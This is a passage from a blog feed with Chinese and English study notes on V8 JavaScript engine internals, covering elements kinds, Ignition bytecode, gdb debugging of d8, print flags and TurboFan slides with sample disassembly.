&lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x3c90a5102241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-084456.png" alt=""><br>  在上面例子中，我们给数组添加了一个non-configurable属性。这个信息就会被保存慢元素字典的triplet中的descriptor 部分。需要切记一点，数组方法在那些拥有慢元素的对象上的性能会相当慢。</p><h3 id="The-ElementsAccessor"><a href="#The-ElementsAccessor" class="headerlink" title="The ElementsAccessor"></a>The ElementsAccessor</h3><p>你可以想到开发人员根本不愿意为这20种元素在C++中对应重复写20遍数组方法。这里就是体现C++神奇的地方了。为了不实现数组方法一遍又一遍，我们建立了一个属性存取器（ElementsAccessor），在它里面大部分都仅仅是简单的属性访问相关的方法。这个属性访问其依赖C++中的CRTP来实现不同种类需求的数组方法。所以，有时如果我们调用例如数组的slice，V8会调用C++中的代码，然后通过属性存取器来选择所需函数，如slice的专门版本。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-090501.jpg" alt=""></p><h2 id="学习v8字节码"><a href="#学习v8字节码" class="headerlink" title="学习v8字节码"></a>学习v8字节码</h2><h3 id="阅读和打印（只是个例子）"><a href="#阅读和打印（只是个例子）" class="headerlink" title="阅读和打印（只是个例子）"></a>阅读和打印（只是个例子）</h3><p><code>./d8 --print-bytecode test.js</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function incrementX(obj) &#123;</span><br><span class="line">  return 1 + obj.x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">incrementX(&#123;x: 42&#125;);</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">$ node --print-bytecode incrementX.js</span><br><span class="line">...</span><br><span class="line">[generating bytecode for function: incrementX]</span><br><span class="line">Parameter count 2</span><br><span class="line">Frame size 8</span><br><span class="line">  12 E&gt; 0x2ddf8802cf6e @    StackCheck</span><br><span class="line">  19 S&gt; 0x2ddf8802cf6f @    LdaSmi [1]</span><br><span class="line">        0x2ddf8802cf71 @    Star r0</span><br><span class="line">  34 E&gt; 0x2ddf8802cf73 @    LdaNamedProperty a0, [0], [4]</span><br><span class="line">  28 E&gt; 0x2ddf8802cf77 @    Add r0, [6]</span><br><span class="line">  36 S&gt; 0x2ddf8802cf7a @    Return</span><br><span class="line">Constant pool (size = 1)</span><br><span class="line">0x2ddf8802cf21: [FixedArray] in OldSpace</span><br><span class="line"> - map = 0x2ddfb2d02309 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 0x2ddf8db91611 &lt;String[1]: x&gt;</span><br><span class="line">Handler Table (size = 16)</span><br></pre></td></tr></table></figure></p><ul><li>LdaSmi [1]<br>LdaSmi [1]将常量 1 加载到累加器中。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-144516.jpg" alt=""></li><li>Star r0<br>接下来，Star r0 将当前在累加器中的值 1 存储在寄存器 r0 中。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-145501.jpg" alt=""></li><li>LdaNamedProperty a0, [0], [4]<br>LdaNamedProperty 将 a0 的命名属性加载到累加器中。ai 指向 incrementX() 的第 i 个参数。在这个例子中，我们在 a0 上查找一个命名属性，这是 incrementX() 的第一个参数。该属性名由常量 0 确定。LdaNamedProperty 使用 0 在单独的表中查找名称：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- length: 1</span><br><span class="line">           0: 0x2ddf8db91611 &lt;String[1]: x&gt;</span><br></pre></td></tr></table></figure></li></ul><p>可以看到，0 映射到了 x。因此这行字节码的意思是加载 obj.x。<br>那么值为 4 的操作数是干什么的呢？ 它是函数 incrementX() 的反馈向量的索引。反馈向量包含用于性能优化的 runtime 信息。<br>现在寄存器看起来是这样的：<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-145844.jpg" alt=""></p><ul><li><p>Add r0, [6]<br>最后一条指令将 r0 加到累加器，结果是 43。 6 是反馈向量的另一个索引。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-145912.jpg" alt=""></p></li><li><p>Return<br>Return 返回累加器中的值。返回语句是函数 incrementX() 的结束。此时 incrementX() 的调用者可以在累加器中获得值 43，并可以进一步处理此值。</p></li></ul><p>乍一看，V8 的字节码看起来非常奇怪，特别是当我们打印出所有的额外信息。但是一旦你知道 Ignition 是一个带有累加器寄存器的寄存器，你就可以分析出大多数字节码都干了什么。</p><h3 id="bytecode如何产生"><a href="#bytecode如何产生" class="headerlink" title="bytecode如何产生"></a>bytecode如何产生</h3><ul><li>加法<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-150922.png" alt=""></li><li>访问对象<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-151626.png" alt=""><h3 id="编译bytecode"><a href="#编译bytecode" class="headerlink" title="编译bytecode"></a>编译bytecode</h3><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-152050.png" alt=""></li></ul><h2 id="v8自带的gdb命令"><a href="#v8自带的gdb命令" class="headerlink" title="v8自带的gdb命令"></a>v8自带的gdb命令</h2><p>在/tools中可以找到gdbinit和gdb-v8-support.py<br>我将其都复制到调试路径下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/v8/v8/out.gn/x64.debug$ ls | grep gdb</span><br><span class="line">gdbinit</span><br><span class="line">gdb-v8-support.py</span><br></pre></td></tr></table></figure></p><p>对如下代码进行测试<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=[<span class="number">0xdeadbee</span>,<span class="number">0xdeadbeef</span>,<span class="string">"hoge"</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ source gdbinit</span><br><span class="line">gdb-peda$ source gdb-v8-support.py </span><br><span class="line">gdb-peda$ find 0xdeadbee</span><br><span class="line">Searching for &apos;0xdeadbee&apos; in: None ranges</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">mapped : 0x5e88e28c6c4 --&gt; 0x7daafaa10deadbee </span><br><span class="line">   </span><br><span class="line">gdb-peda$ v8print 0x5e88e28c6c4-0x14+1</span><br><span class="line">0x5e88e28c6b1: [FixedArray]</span><br><span class="line"> - map = 0x2702dbb82679 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - length: 3</span><br><span class="line">           0: 233495534</span><br><span class="line">           1: 0x318d7daafaa1 &lt;Number 3.73593e+09&gt;</span><br><span class="line">           2: 0x318d7daafa81 &lt;String[4]: hoge&gt;</span><br><span class="line">gdb-peda$ v8print *(void **)(0x5e88e28c6c4-0x14)</span><br><span class="line">0x2702dbb82679: [Map]</span><br><span class="line"> - type: FIXED_ARRAY_TYPE</span><br><span class="line"> - instance size: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x504a7702311 &lt;undefined&gt;</span><br><span class="line"> - instance descriptors (own) #0: 0x504a7702231 &lt;FixedArray[0]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x504a7702201 &lt;null&gt;</span><br><span class="line"> - constructor: 0x504a7702201 &lt;null&gt;</span><br><span class="line"> - code cache: 0x504a7702241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x504a7702241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure><h2 id="JIT"><a href="#JIT" class="headerlink" title="JIT"></a>JIT</h2><h3 id="print-flag"><a href="#print-flag" class="headerlink" title="print flag"></a>print flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --help |grep print</span><br><span class="line">  --print_bytecode (print bytecode generated by ignition interpreter)</span><br><span class="line">  --print_bytecode_filter (filter for selecting which functions to print bytecode)</span><br><span class="line">  --hydrogen_stats (print statistics for hydrogen)</span><br><span class="line">  --print_deopt_stress (print number of possible deopt points)</span><br><span class="line">  --turbo_stats (print TurboFan statistics)</span><br><span class="line">  --turbo_stats_nvp (print TurboFan statistics in machine-readable format)</span><br><span class="line">  --print_wasm_code (Print WebAssembly code)</span><br><span class="line">  --trace_gc (print one trace line following each garbage collection)</span><br><span class="line">  --trace_gc_nvp (print one detailed trace line in name=value format after each garbage collection)</span><br><span class="line">  --trace_gc_ignore_scavenger (do not print trace line after scavenger collection)</span><br><span class="line">  --trace_idle_notification (print one trace line following each idle notification)</span><br><span class="line">  --trace_idle_notification_verbose (prints the heap state used by the idle notification)</span><br><span class="line">  --trace_gc_verbose (print more details following each garbage collection)</span><br><span class="line">  --trace_allocation_stack_interval (print stack trace after &lt;n&gt; free-list allocations)</span><br><span class="line">  --trace_mutator_utilization (print mutator utilization, allocation speed, gc speed)</span><br><span class="line">  --trace_codegen (print name of functions for which code is generated)</span><br><span class="line">  --trace_serializer (print code serializer trace)</span><br><span class="line">  --external_reference_stats (print statistics on external references used during serialization)</span><br><span class="line">  --trace_side_effect_free_debug_evaluate (print debug messages for side-effect-free debug-evaluate for testing)</span><br><span class="line">  --max_stack_trace_source_length (maximum length of function source code printed in a stack trace.)</span><br><span class="line">  --trace_object_groups (print object groups detected during each garbage collection)</span><br><span class="line">  --use_idle_notification (Use idle notification to reduce memory footprint.)</span><br><span class="line">  --use_verbose_printer (allows verbose printing)</span><br><span class="line">  --log_regs_modified (When logging register values, only print modified registers.)</span><br><span class="line">  --stack_trace_on_illegal (print stack trace when an illegal exception is thrown)</span><br><span class="line">  --print_all_exceptions (print exception object and stack trace on each thrown exception)</span><br><span class="line">  --print_ast (print source AST)</span><br><span class="line">  --print_builtin_ast (print source AST for builtins)</span><br><span class="line">  --print_builtin_scopes (print scopes for builtins)</span><br><span class="line">  --print_scopes (print scopes)</span><br><span class="line">  --gc_verbose (print stuff during garbage collection)</span><br><span class="line">  --print_handles (report handles after GC)</span><br><span class="line">  --print_global_handles (report global handles after GC)</span><br><span class="line">  --print_turbo_replay (print C++ code to recreate TurboFan graphs)</span><br><span class="line">  --trace_normalization (prints when objects are turned into dictionaries.)</span><br><span class="line">  --print_break_location (print source location on debug break)</span><br><span class="line">  --print_opt_source (print source code of optimized and inlined functions)</span><br><span class="line">  --print_code_stubs (print code stubs)</span><br><span class="line">  --print_code (print generated code)</span><br><span class="line">  --print_opt_code (print optimized code)</span><br><span class="line">  --print_opt_code_filter (filter for printing optimized code)</span><br><span class="line">  --print_unopt_code (print unoptimized code before printing optimized code based on it)</span><br><span class="line">  --print_code_verbose (print more information for code)</span><br><span class="line">  --print_builtin_code (print generated code for builtins)</span><br><span class="line">  --sodium (print generated code output suitable for use with the Sodium code viewer)</span><br><span class="line">  --print_all_code (enable all flags related to printing code)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;v8-hidden-class-test&quot;&gt;&lt;a href=&quot;#v8-hidden-class-test&quot; class=&quot;headerlink&quot; title=&quot;v8 hidden class test&quot;&gt;&lt;/a&gt;v8 hidden class test&lt;/h2&gt;&lt;
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>v8 slide collection</title>
    <link href="http://eternalsakura13.com/2018/06/18/v8_ppt/"/>
    <id>http://eternalsakura13.com/2018/06/18/v8_ppt/</id>
    <published>2018-06-17T18:54:45.782Z</published>
    <updated>2018-06-23T18:59:15.587Z</updated>
    
    <content type="html"><![CDATA[<h2 id="The-TurboFan-architecture-entry-points"><a href="#The-TurboFan-architecture-entry-points" class="headerlink" title="The TurboFan architecture / entry points"></a>The TurboFan architecture / entry points</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-135445.png" alt=""></p><h2 id="TurboFan-pipeline-high-level"><a href="#TurboFan-pipeline-high-level" class="headerlink" title="TurboFan pipeline (high-level)"></a>TurboFan pipeline (high-level)</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-135820.png" alt=""></p><h2 id="Code-generation-example"><a href="#Code-generation-example" class="headerlink" title="Code generation example"></a>Code generation example</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-135911.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">                  -- B0 start (construct frame) --</span><br><span class="line">0x3caafc104060     0  55             push rbp</span><br><span class="line">0x3caafc104061     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x3caafc104064     4  56             push rsi</span><br><span class="line">0x3caafc104065     5  57             push rdi</span><br><span class="line">0x3caafc104066     6  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x3caafc10406d    13  0f863d000000   jna 80  (0x3caafc1040b0)</span><br><span class="line">                  -- B2 start --</span><br><span class="line">                  -- B3 start (deconstruct frame) --</span><br><span class="line">0x3caafc104073    19  488b4518       REX.W movq rax,[rbp+0x18]</span><br><span class="line">0x3caafc104077    23  a801           test al,0x1</span><br><span class="line">0x3caafc104079    25  0f8548000000   jnz 103  (0x3caafc1040c7)</span><br><span class="line">0x3caafc10407f    31  488b5d10       REX.W movq rbx,[rbp+0x10]</span><br><span class="line">0x3caafc104083    35  f6c301         testb rbx,0x1</span><br><span class="line">0x3caafc104086    38  0f8540000000   jnz 108  (0x3caafc1040cc)</span><br><span class="line">0x3caafc10408c    44  488bd3         REX.W movq rdx,rbx</span><br><span class="line">0x3caafc10408f    47  48c1ea20       REX.W shrq rdx, 32</span><br><span class="line">0x3caafc104093    51  488bc8         REX.W movq rcx,rax</span><br><span class="line">0x3caafc104096    54  48c1e920       REX.W shrq rcx, 32</span><br><span class="line">0x3caafc10409a    58  03d1           addl rdx,rcx</span><br><span class="line">0x3caafc10409c    60  0f802f000000   jo 113  (0x3caafc1040d1)</span><br><span class="line">0x3caafc1040a2    66  48c1e220       REX.W shlq rdx, 32</span><br><span class="line">0x3caafc1040a6    70  488bc2         REX.W movq rax,rdx</span><br><span class="line">0x3caafc1040a9    73  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x3caafc1040ac    76  5d             pop rbp</span><br><span class="line">0x3caafc1040ad    77  c21800         ret 0x18</span><br><span class="line">                  -- B4 start (no frame) --</span><br><span class="line">                  -- B1 start (deferred) --</span><br><span class="line">                  -- B0 start (construct frame) --</span><br><span class="line">0x3caafc104060     0  55             push rbp</span><br><span class="line">0x3caafc104061     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x3caafc104064     4  56             push rsi</span><br><span class="line">0x3caafc104065     5  57             push rdi</span><br><span class="line">0x3caafc104066     6  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x3caafc10406d    13  0f863d000000   jna 80  (0x3caafc1040b0)</span><br><span class="line">                  -- B2 start --</span><br><span class="line">                  -- B3 start (deconstruct frame) --</span><br><span class="line">0x3caafc104073    19  488b4518       REX.W movq rax,[rbp+0x18]</span><br><span class="line">0x3caafc104077    23  a801           test al,0x1</span><br><span class="line">0x3caafc104079    25  0f8548000000   jnz 103  (0x3caafc1040c7)</span><br><span class="line">0x3caafc10407f    31  488b5d10       REX.W movq rbx,[rbp+0x10]</span><br><span class="line">0x3caafc104083    35  f6c301         testb rbx,0x1</span><br><span class="line">0x3caafc104086    38  0f8540000000   jnz 108  (0x3caafc1040cc)</span><br><span class="line">0x3caafc10408c    44  488bd3         REX.W movq rdx,rbx</span><br><span class="line">0x3caafc10408f    47  48c1ea20       REX.W shrq rdx, 32</span><br><span class="line">0x3caafc104093    51  488bc8         REX.W movq rcx,rax</span><br><span class="line">0x3caafc104096    54  48c1e920       REX.W shrq rcx, 32</span><br><span class="line">0x3caafc10409a    58  03d1           addl rdx,rcx</span><br><span class="line">0x3caafc10409c    60  0f802f000000   jo 113  (0x3caafc1040d1)</span><br><span class="line">0x3caafc1040a2    66  48c1e220       REX.W shlq rdx, 32</span><br><span class="line">0x3caafc1040a6    70  488bc2         REX.W movq rax,rdx</span><br><span class="line">0x3caafc1040a9    73  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x3caafc1040ac    76  5d             pop rbp</span><br><span class="line">0x3caafc1040ad    77  c21800         ret 0x18</span><br><span class="line">                  -- B4 start (no frame) --</span><br><span class="line">                  -- B1 start (deferred) --</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-141841.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-142111.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-142522.png" alt=""></p><h2 id="Turbofan-IR"><a href="#Turbofan-IR" class="headerlink" title="Turbofan IR"></a>Turbofan IR</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><ul><li>Graph based IR<ul><li>Nodes for operations.</li><li>Edges for value flow, control flow and dependencies.</li><li>No distinction between basic blocks and statements.</li><li>Single-static assignment.</li></ul></li><li>High/middle/low-level IR layering.</li><li>Side effects modelled as edges.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-143530.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-143638.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-143823.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-143847.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-143923.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-144159.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-144341.png" alt=""></li></ul><h3 id="节点分层"><a href="#节点分层" class="headerlink" title="节点分层"></a>节点分层</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-145153.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-145249.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-145907.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-150532.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-150444.png" alt=""></p><h3 id="IR分层和phases"><a href="#IR分层和phases" class="headerlink" title="IR分层和phases"></a>IR分层和phases</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-150639.png" alt=""></p><h4 id="lowering-amp-amp-Typed-Lowering"><a href="#lowering-amp-amp-Typed-Lowering" class="headerlink" title="lowering&amp;&amp;Typed Lowering"></a>lowering&amp;&amp;Typed Lowering</h4><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-150811.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-150917.png" alt=""></p><h4 id="Representation-selection"><a href="#Representation-selection" class="headerlink" title="Representation selection"></a>Representation selection</h4><p>Representation selection now chooses machine representation and inserts conversions.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-151052.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-151159.png" alt=""></p><h4 id="Scheduling"><a href="#Scheduling" class="headerlink" title="Scheduling"></a>Scheduling</h4><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-151948.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-152002.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-152013.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-152023.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-152032.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-13-152108.png" alt=""></p><h2 id="High-performance-JavaScript-with-V8"><a href="#High-performance-JavaScript-with-V8" class="headerlink" title="High performance JavaScript with V8"></a>High performance JavaScript with V8</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-185932.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-190018.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-190158.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function MyObject(x) &#123;</span><br><span class="line">  this.X = x;</span><br><span class="line">&#125;</span><br><span class="line">function getX(obj) &#123;</span><br><span class="line">  return obj.X;</span><br><span class="line">&#125;</span><br><span class="line">var o = new MyObject(3);</span><br><span class="line">print(getX(o));</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">parallels@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 test.js </span><br><span class="line">3</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-190248.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-191002.png" alt=""></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-191809.png" alt=""></p><p>用作参考：<a href="https://www.cnblogs.com/yumianhu/p/3707427.html" target="_blank" rel="noopener">https://www.cnblogs.com/yumianhu/p/3707427.html</a><br>关于IC的Cahce State,不过内容略过时。</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-192442.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-192512.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-192553.png" alt=""><br>Crankshaft已经废弃，这里只是看下type feedback和check<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-193124.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-193112.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-193028.png" alt=""></p><h2 id="理解v8-bytecode"><a href="#理解v8-bytecode" class="headerlink" title="理解v8 bytecode"></a>理解v8 bytecode</h2><p><a href="https://zhuanlan.zhihu.com/p/28590489" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28590489</a><br>有中文翻译，读起来很快（逃<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-200254.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-203313.png" alt=""><br><a href="https://2017.jsconf.eu/speakers/" target="_blank" rel="noopener">https://2017.jsconf.eu/speakers/</a><br><a href="https://www.chromium.org/developers/how-tos/run-chromium-with-flags" target="_blank" rel="noopener">https://www.chromium.org/developers/how-tos/run-chromium-with-flags</a></p><h2 id="Parsing-JavaScript-better-lazy-than-eager"><a href="#Parsing-JavaScript-better-lazy-than-eager" class="headerlink" title="Parsing JavaScript-better lazy than eager?"></a>Parsing JavaScript-better lazy than eager?</h2><p><a href="https://www.youtube.com/watch?v=Fg7niTmNNLg" target="_blank" rel="noopener">https://www.youtube.com/watch?v=Fg7niTmNNLg</a></p><h2 id="Ignition-an-interpreter-for-v8"><a href="#Ignition-an-interpreter-for-v8" class="headerlink" title="Ignition - an interpreter for v8"></a>Ignition - an interpreter for v8</h2><h3 id="bytecode如何产生"><a href="#bytecode如何产生" class="headerlink" title="bytecode如何产生"></a>bytecode如何产生</h3><ul><li>加法<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-150922.png" alt=""></li><li>访问对象<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-151626.png" alt=""><h3 id="编译bytecode"><a href="#编译bytecode" class="headerlink" title="编译bytecode"></a>编译bytecode</h3><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-152050.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-23-184859.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-23-184941.png" alt=""></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;The-TurboFan-architecture-entry-points&quot;&gt;&lt;a href=&quot;#The-TurboFan-architecture-entry-points&quot; class=&quot;headerlink&quot; title=&quot;The TurboFan arc
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>Source to Binary Jounrney of V8 javascript engine</title>
    <link href="http://eternalsakura13.com/2018/06/16/nodefest_v8/"/>
    <id>http://eternalsakura13.com/2018/06/16/nodefest_v8/</id>
    <published>2018-06-16T13:15:20.453Z</published>
    <updated>2018-06-18T18:31:30.410Z</updated>
    
